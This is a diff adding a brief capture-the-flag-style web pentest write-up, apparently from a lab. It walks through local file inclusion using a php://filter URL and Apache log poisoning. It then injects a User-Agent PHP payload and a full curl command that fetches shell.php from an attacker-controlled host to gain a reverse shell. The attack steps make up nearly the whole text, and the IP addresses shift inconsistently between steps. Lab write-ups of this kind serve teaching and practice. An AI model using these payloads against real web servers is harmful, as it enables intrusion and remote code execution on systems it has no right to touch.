@@ -1,0 +1,16 @@
+This is a pure web app pentest, after scanning with nmap we do not find ports or services that could be exploited, so there is an exploitation of some web vulnerability.
+
+We can use php filters, because in this case they work, with them we can access files:
+http://10.10.144.186/?view=php://filter/read=convert.base64-encode/resource=./dog/../index
+
+Let's try to do log poisoning
+http://10.10.144.186/?view=./dog/../../../../var/log/apache2/access.log
+
+We can use log poisoning but our goal now is to get the revere shell. We can do this by injecting PHP code to the third line in the request that we will intercept with 
+burp, i.e. to the user-agent:
+<? php file_put_contents ('shell.php', file_get_contents ('http://10.9.91.231/shell.php')); ?>
+
+So we set up our web server with the help of python.
+To run our shell now, we run a request:
+curl -A "<?php file_put_contents('shell.php', file_get_contents('http://10.9.0.54/shell.php')); ?>" 
+\ "http://10.10.197.237/?view=./dog/../../../../var/log/apache2/access.log&ext"  
